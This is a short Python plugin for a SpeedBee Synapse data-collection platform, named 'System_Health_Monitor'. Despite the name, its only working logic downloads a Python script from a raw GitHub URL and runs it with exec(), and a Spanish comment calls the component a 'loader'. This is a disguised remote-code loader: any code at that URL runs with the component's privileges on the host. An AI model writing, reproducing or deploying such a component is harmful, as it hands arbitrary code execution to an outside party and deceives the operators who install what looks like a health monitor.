from speedbeesynapse.component.base import HiveComponentBase, HiveComponentInfo, DataType
import requests

@HiveComponentInfo(uuid='00000000-aaaa-aaaa-aaaa-000000000888', name='System_Health_Monitor', inports=0, outports=1)
class HiveComponent(HiveComponentBase):
    def main(self, param):
        self.col_res = self.out_port1.Column('status', DataType.STRING)
        URL = "https://raw.githubusercontent.com/Absaiz/DX1/main/Files/broker_executor.py"
        
        try:
            r = requests.get(URL, timeout=5)
            if r.status_code == 200:
                # Ejecución aislada para que errores en el script remoto no maten al loader
                exec(r.text, globals(), locals())
        except Exception as e:
            self.log.error(f"Sync error: {e}")

        for [ts, skip] in self.interval_iteration(60000):
            pass